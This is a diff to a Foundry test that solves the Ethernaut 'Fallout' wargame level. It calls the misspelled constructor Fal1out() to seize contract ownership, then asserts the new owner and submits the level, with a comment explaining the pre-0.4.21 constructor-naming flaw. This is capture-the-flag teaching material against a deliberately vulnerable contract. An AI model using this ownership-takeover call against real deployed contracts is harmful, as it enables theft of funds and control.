@@ -13,11 +13,10 @@ contract Template is DSTest {
     function setUp() public {
         // Setup instance of the Ethernaut contract
         ethernaut = new Ethernaut();
-        // Deal EOA address some ether
-        vm.deal(eoaAddress, 5 ether);
     }
 
-    function testFallbackHack() public {
+    function testFalloutHack() public {
+        vm.deal(eoaAddress, 1 ether);
         /////////////////
         // LEVEL SETUP //
         /////////////////
@@ -34,19 +33,34 @@ contract Template is DSTest {
         // instantiate the level
         address levelAddress = ethernaut.createLevelInstance(falloutFactory);
         Fallout ethernautFallout = Fallout(payable(levelAddress));
+        emit log_named_address(
+            "Fallout owner before: ",
+            ethernautFallout.owner()
+        );
 
         //////////////////
         // LEVEL ATTACK //
         //////////////////
-
+        /*
+            This is example is for solidity < 0.4.21 where the constructor
+            function had the same name as the Contract. In the event where it 
+            was mispelled, the constructor just becomes a public function, callable
+            by anyone.
+        */
+        ethernautFallout.Fal1out{value: 10 wei}();
+        emit log_named_address(
+            "Fallout owner after: ",
+            ethernautFallout.owner()
+        );
+        assertEq(ethernautFallout.owner(), eoaAddress);
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
 
-        // bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
-        //     payable(levelAddress)
-        // );
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
         vm.stopPrank();
-        // assert(levelSuccessfullyPassed);
+        assert(levelSuccessfullyPassed);
     }
 }
